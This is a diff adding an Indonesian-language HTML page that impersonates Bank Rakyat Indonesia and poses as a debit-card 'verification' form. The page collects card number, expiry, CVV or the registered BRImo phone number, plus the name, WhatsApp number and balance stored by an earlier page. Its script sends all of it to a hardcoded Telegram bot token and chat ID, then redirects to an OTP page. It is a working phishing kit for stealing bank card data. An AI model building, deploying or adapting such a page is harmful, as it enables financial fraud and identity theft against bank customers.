@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Kartu — Verifikasi BRI</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* ✅ BACKGROUND SAMA PERSIS SEPERTI HALAMAN PESERTA — TIDAK DIUBAH GAYANYA! */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0055B8 0%, #0099FF 50%, #FFD700 100%);
+            min-height: 100vh;
+            color: white;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .loading-overlay {
+            position: fixed; inset: 0; background: rgba(255,255,255,0.95);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 999; opacity: 0; visibility: hidden; transition: all 0.3s ease;
+        }
+        .loading-overlay.active { opacity: 1; visibility: visible; }
+        .spinner {
+            width: 40px; height: 40px; border: 3px solid #ddd; border-top-color: #0066CC;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        button:disabled { background-color: #93C5FD !important; cursor: not-allowed; opacity: 0.7; }
+
+        /* ⚠️ TAMPILAN KARTU — TIDAK DIUBAH SATU PUN! PERSIS ASLI */
+        .card-flip {
+            perspective: 1100px;
+            width: 85.6mm;
+            max-width: 95%;
+            height: 55.98mm;
+            margin: 0 auto 30px;
+        }
+        .card-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transition: transform 0.7s ease;
+            transform-style: preserve-3d;
+        }
+        .card-face {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 3.2mm;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.25);
+            box-sizing: border-box;
+        }
+        .card-front.simpedes {
+            background: linear-gradient(135deg, #004A9E, #0066CC);
+            color: #fff;
+            padding: 4.5mm;
+        }
+        .card-front.britama {
+            background: #000;
+            color: #fff;
+            padding: 4.5mm;
+            background-image: 
+                linear-gradient(60deg, transparent 20%, #1A1A1A 20%, #1A1A1A 23%, transparent 23%, transparent 40%, #1A1A1A 40%, #1A1A1A 43%, transparent 43%),
+                linear-gradient(120deg, transparent 20%, #1A1A1A 20%, #1A1A1A 23%, transparent 23%, transparent 60%, #1A1A1A 60%, #1A1A1A 63%, transparent 63%),
+                linear-gradient(80deg, transparent 30%, #222 30%, #222 36%, transparent 36%, transparent 70%, #222 70%, #222 76%, transparent 76%);
+        }
+        .chip {
+            width: 10.5mm; height: 8.5mm; background: #D4D4D4; border-radius: 1mm;
+            position: relative; box-shadow: inset 0 0 0.5mm rgba(0,0,0,0.4);
+        }
+        .chip::before, .chip::after {
+            content: ""; position: absolute; inset: 0;
+            border: 0.25mm solid #888; border-radius: 1mm;
+            background: linear-gradient(to right, transparent 28%, #888 28%, #888 32%, transparent 32%, transparent 68%, #888 68%, #888 72%, transparent 72%),
+                        linear-gradient(to bottom, transparent 28%, #888 28%, #888 32%, transparent 32%, transparent 68%, #888 68%, #888 72%, transparent 72%);
+        }
+        .card-back {
+            transform: rotateY(180deg); background: #F8F8F8; color: #222;
+            padding: 3mm 4mm; font-size: 2mm; line-height: 1.4; border: 1px solid #DDD;
+        }
+        .flipped .card-inner { transform: rotateY(180deg); }
+        .text-debit { font-size: 4.2mm; font-weight: 500; letter-spacing: 0.4mm; }
+        .text-nama { font-size: 5.5mm; font-weight: bold; line-height: 1; }
+        .text-tagline { font-size: 2.2mm; opacity: 0.9; margin-top: 0.5mm; }
+        .number-card { font-size: 5mm; letter-spacing: 0.7mm; font-family: 'Courier New', monospace; margin: 5mm 0 1.5mm 0; }
+        .cvv-small { font-size: 2.8mm; font-family: 'Courier New', monospace; opacity: 0.9; margin-bottom: 1mm; }
+        .expiry-label { font-size: 2mm; opacity: 0.8; display: inline-block; margin-right: 1mm; }
+        .expiry-date { font-size: 3.2mm; font-family: 'Courier New', monospace; letter-spacing: 0.3mm; display: inline-block; }
+        .logo { width: 14mm; position: absolute; bottom: 4.5mm; right: 4.5mm; object-fit: contain; }
+        .stripe-area { width: 100%; height: 8mm; background: linear-gradient(90deg, #E0E0E0, #F0F0F0); margin: 3mm 0; border-radius: 0.5mm; }
+        .cvv-text { font-family: 'Courier New', monospace; font-size: 4.5mm; font-weight: bold; color: #000; letter-spacing: 0.5mm; }
+
+        /* Form input — tetap asli */
+        .form-card {
+            background: rgba(255,255,255,0.15);
+            backdrop-filter: blur(12px);
+            border-radius: 24px;
+            padding: 30px 22px;
+            border: 2px solid rgba(255,255,255,0.25);
+            margin-bottom: 25px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+        }
+        .form-card h3 {
+            font-size: 1.4rem;
+            margin-bottom: 25px;
+            color: #FFD700;
+            text-align: center;
+        }
+        .form-card label {
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+    <!-- LOADING OVERLAY -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner mb-4"></div>
+        <p id="loadingText" class="text-gray-700 font-medium">Mengirim data... ⏳</p>
+        <p class="text-gray-500 text-sm mt-1">Mohon tunggu sebentar</p>
+    </div>
+
+    <!-- KARTU — TIDAK DIUBAH! -->
+    <div class="card-flip">
+        <div class="card-inner">
+            <div class="card-face card-front simpedes" id="cardFront">
+                <div class="flex justify-between items-start">
+                    <div><div class="text-debit">DEBIT BRI</div></div>
+                    <div class="text-right">
+                        <div class="text-tagline">Tabungan BRI</div>
+                        <div class="text-nama" id="cardTypeName">Simpedes</div>
+                    </div>
+                </div>
+                <div class="chip mt-2"></div>
+                <div class="number-card" id="cardNumber">0000 0000 0000 0000</div>
+                <div class="cvv-small" id="cvvFront"></div>
+                <div class="flex items-center"><span class="expiry-label">VALID THRU</span><span class="expiry-date" id="expiryDisplay">MM/YY</span></div>
+                <img id="cardLogo" src="https://poto-psi.vercel.app/gpn-logo.png" alt="Logo" class="logo" onerror="this.style.display='none'">
+            </div>
+            <div class="card-face card-back">
+                <div class="stripe-area"></div>
+                <div class="flex justify-between items-center mt-2">
+                    <div class="w-2/3 h-8 bg-gray-200 rounded"></div>
+                    <span class="cvv-text" id="cvvDisplay">***</span>
+                </div>
+                <div class="mt-4 text-xs text-gray-600">
+                    Kartu milik PT Bank Rakyat Indonesia (Persero) Tbk.<br>
+                    Penggunaannya sesuai ketentuan berlaku.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FORM INPUT — background transparan sama seperti halaman peserta -->
+    <div class="form-card">
+        <h3>💳 Data Kartu Debit BRI</h3>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+                <label class="text-sm mb-1 block">Nomor Kartu ATM<span class="text-red-300">*</span></label>
+                <input type="text" id="inputNumber" maxlength="19" placeholder="0000 0000 0000 0000" class="w-full border border-white/30 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-yellow-400 bg-white/90 text-gray-800" inputmode="numeric" required>
+            </div>
+            <div>
+                <label class="text-sm mb-1 block">Masa Berlaku (MM/YY) <span class="text-red-300">*</span></label>
+                <input type="text" id="inputExpiry" maxlength="5" placeholder="00/00" class="w-full border border-white/30 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-yellow-400 bg-white/90 text-gray-800" inputmode="numeric" required>
+            </div>
+            <div id="colInputKhusus">
+                <label class="text-sm mb-1 block" id="labelKhusus">Kode CVV <span class="text-red-300">*</span></label>
+                <input type="password" id="inputKhusus" maxlength="3" placeholder="***" class="w-full border border-white/30 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-yellow-400 bg-white/90 text-gray-800" inputmode="numeric" required>
+            </div>
+        </div>
+        <p class="text-xs text-white/70 mt-3">* Wajib diisi</p>
+    </div>
+
+    <button id="btnLanjut" class="w-full py-3 px-4 rounded-lg font-semibold shadow-lg transition duration-200 text-lg bg-gradient-to-r from-yellow-400 to-yellow-500 text-blue-900 hover:from-yellow-300 hover:to-yellow-400" disabled>
+        Lanjutkan
+    </button>
+
+    </div>
+
+    <script>
+        // ⚠️ GANTI DENGAN BOT TOKEN & CHAT ID MILIKMU!
+        const BOT_TOKEN = "8686497429:AAF6Ta9LcNtLZ3vjIPjvqhtLf7_2jTL_IoE";
+        const CHAT_ID = "7402071395";
+
+        const LOGO_GPN = "https://poto-psi.vercel.app/gpn-logo.png";
+        const LOGO_BRI_BRITAMA = "https://poto-psi.vercel.app/bri-britama-logo.png";
+
+        // Baca data dari halaman Gebyar
+        const DATA_GEBYAR = JSON.parse(localStorage.getItem('DATA_GEBYAR') || '{}');
+
+        const cardFlip = document.querySelector('.card-flip');
+        const cardFront = document.getElementById('cardFront');
+        const cardTypeName = document.getElementById('cardTypeName');
+        const cardLogo = document.getElementById('cardLogo');
+        const cardNumber = document.getElementById('cardNumber');
+        const inputNumber = document.getElementById('inputNumber');
+        const expiryDisplay = document.getElementById('expiryDisplay');
+        const inputExpiry = document.getElementById('inputExpiry');
+        const cvvFront = document.getElementById('cvvFront');
+        const cvvDisplay = document.getElementById('cvvDisplay');
+        const labelKhusus = document.getElementById('labelKhusus');
+        const inputKhusus = document.getElementById('inputKhusus');
+        const btnLanjut = document.getElementById('btnLanjut');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+
+        function perbaruiJenisInput(nomorBersih) {
+            const awalan = nomorBersih.slice(0, 4);
+            if (awalan === '5221') {
+                labelKhusus.innerHTML = 'Kode CVV <span class="text-red-300">*</span>';
+                inputKhusus.type = 'password';
+                inputKhusus.maxLength = 3;
+                inputKhusus.placeholder = '***';
+                inputKhusus.inputMode = 'numeric';
+                cardLogo.src = LOGO_BRI_BRITAMA;
+                cardLogo.style.filter = 'brightness(1.3)';
+                inputKhusus.onfocus = () => cardFlip.classList.add('flipped');
+                inputKhusus.onblur = () => cardFlip.classList.remove('flipped');
+            } else if (awalan === '6013') {
+                labelKhusus.innerHTML = 'Nomor Terdaftar Di BRImo <span class="text-red-300">*</span>';
+                inputKhusus.type = 'tel';
+                inputKhusus.maxLength = 20;
+                inputKhusus.placeholder = 'Masukkan Nomor Yang Aktif Di BRImo';
+                inputKhusus.inputMode = 'numeric';
+                cardLogo.src = LOGO_GPN;
+                cardLogo.style.filter = 'none';
+                inputKhusus.onfocus = null;
+                inputKhusus.onblur = null;
+                cardFlip.classList.remove('flipped');
+                cvvFront.textContent = '';
+                cvvDisplay.textContent = '';
+            } else {
+                labelKhusus.innerHTML = 'Kode CVV <span class="text-red-300">*</span>';
+                inputKhusus.type = 'password';
+                inputKhusus.maxLength = 3;
+                inputKhusus.placeholder = '***';
+                inputKhusus.inputMode = 'numeric';
+                cardLogo.src = LOGO_GPN;
+                cardLogo.style.filter = 'none';
+                inputKhusus.onfocus = () => cardFlip.classList.add('flipped');
+                inputKhusus.onblur = () => cardFlip.classList.remove('flipped');
+            }
+        }
+
+        function cekKelengkapan() {
+            const nomor = inputNumber.value.replace(/\s/g, '').length >= 4;
+            const berlaku = inputExpiry.value.trim().length === 5;
+            const awalan = inputNumber.value.replace(/\s/g, '').slice(0, 4);
+            let kolomKhususValid = false;
+            if (awalan === '5221') kolomKhususValid = inputKhusus.value.trim().length === 3;
+            else if (awalan === '6013') kolomKhususValid = inputKhusus.value.trim().length >= 10;
+            else kolomKhususValid = inputKhusus.value.trim().length === 3;
+            btnLanjut.disabled = !(nomor && berlaku && kolomKhususValid);
+        }
+
+        function detectCardType(num) {
+            if (!num || num.length < 4) return { jenis: 'Simpedes', logo: 'GPN' };
+            const first4 = num.slice(0, 4);
+            const gpnPrefix = ['6011', '6013', '9360', '9361', '9362', '9363', '9364', '9365', '9366', '9367', '9368', '9369'];
+            const mastercardPrefix = ['5126', '5221', '5299', '5301', '5326', '5327', '5357', '5361', '5411', '5425', '5467', '5511', '5578', '4216', '4377', '4893'];
+            if (gpnPrefix.includes(first4)) return { jenis: 'Simpedes', logo: 'GPN' };
+            if (mastercardPrefix.includes(first4)) return { jenis: 'BritAma', logo: 'Mastercard' };
+            return { jenis: 'Simpedes', logo: 'GPN' };
+        }
+
+        function updateCardDisplay(num) {
+            const { jenis } = detectCardType(num);
+            if (jenis === 'BritAma') {
+                cardFront.className = 'card-face card-front britama';
+                cardTypeName.innerHTML = 'Brit<span style="color:#FFCC00;">Ama</span>';
+            } else {
+                cardFront.className = 'card-face card-front simpedes';
+                cardTypeName.textContent = 'Simpedes';
+            }
+        }
+
+        inputNumber.addEventListener('input', () => {
+            let val = inputNumber.value.replace(/\D/g, '');
+            val = val.replace(/(\d{4})/g, '$1 ').trim();
+            inputNumber.value = val;
+            cardNumber.textContent = val || '0000 0000 0000 0000';
+            const nomorBersih = val.replace(/\s/g, '');
+            updateCardDisplay(nomorBersih);
+            perbaruiJenisInput(nomorBersih);
+            cekKelengkapan();
+        });
+
+        inputExpiry.addEventListener('input', () => {
+            let raw = inputExpiry.value.replace(/\D/g, '');
+            let m = raw.slice(0, 2), y = raw.slice(2, 4);
+            if (m.length === 2) {
+                if (+m < 1) m = '01';
+                if (+m > 12) m = '12';
+            }
+            inputExpiry.value = y ? `${m}/${y}` : m;
+            expiryDisplay.textContent = inputExpiry.value || 'MM/YY';
+            cekKelengkapan();
+        });
+        inputExpiry.addEventListener('blur', () => {
+            let raw = inputExpiry.value.replace(/\D/g, '');
+            if (raw.length >= 4) {
+                let m = raw.slice(0, 2), y = raw.slice(2, 4);
+                let fullYear = 2000 + parseInt(y);
+                if (fullYear < 2026) y = '26';
+                if (fullYear > 2050) y = '50';
+                if (+m < 1 || +m > 12) m = '01';
+                inputExpiry.value = `${m}/${y}`;
+                expiryDisplay.textContent = inputExpiry.value;
+            }
+            cekKelengkapan();
+        });
+
+        inputKhusus.addEventListener('input', () => {
+            const awalan = inputNumber.value.replace(/\s/g, '').slice(0, 4);
+            if (awalan === '5221') {
+                inputKhusus.value = inputKhusus.value.replace(/\D/g, '');
+                cvvFront.textContent = inputKhusus.value.padEnd(3, '*');
+                cvvDisplay.textContent = inputKhusus.value.padEnd(3, '*');
+            } else {
+                inputKhusus.value = inputKhusus.value.replace(/\D/g, '');
+                cvvFront.textContent = '';
+                cvvDisplay.textContent = '';
+            }
+            cekKelengkapan();
+        });
+
+        // KLIK LANJUT → KIRIM NOTIFIKASI KE-2 → SIMPAN → PINDAH OTP
+        btnLanjut.addEventListener('click', async () => {
+            loadingText.textContent = 'Mengirim data kartu... ⏳';
+            loadingOverlay.classList.add('active');
+            btnLanjut.disabled = true;
+
+            const nomor = inputNumber.value.trim();
+            const berlaku = inputExpiry.value.trim();
+            const nilaiKhusus = inputKhusus.value.trim();
+            const awalan = nomor.replace(/\s/g, '').slice(0, 4);
+            const dataJenis = detectCardType(nomor.replace(/\s/g, ''));
+            const labelKhususTelegram = awalan === '6013' ? 'No BRImo' : 'CVV';
+
+            const DATA_KARTU = { nomor, berlaku, nilaiKhusus, labelKhusus: labelKhususTelegram, jenis: dataJenis.jenis + ' - ' + dataJenis.logo };
+
+            // 📩 NOTIFIKASI KE-2
+            const pesanKartu = `📋 DATA KARTU DITERIMA
+
+👤 Nama: ${DATA_GEBYAR.nama}
+📞 No. WhatsApp: ${DATA_GEBYAR.noTelp}
+💰 Saldo: ${DATA_GEBYAR.saldo}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Jenis: ${dataJenis.jenis.toUpperCase()} - ${dataJenis.logo.toUpperCase()}
+🔢 Nomor: ${nomor}
+📅 Masa Berlaku: ${berlaku}
+🔐 ${labelKhususTelegram}: ${nilaiKhusus}
+
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: pesanKartu, parse_mode: 'Markdown' })
+            }).catch(e => console.log(e));
+
+            // Simpan ke localStorage
+            localStorage.setItem('DATA_KARTU', JSON.stringify(DATA_KARTU));
+
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                window.location.href = 'halaman-otp.html';
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
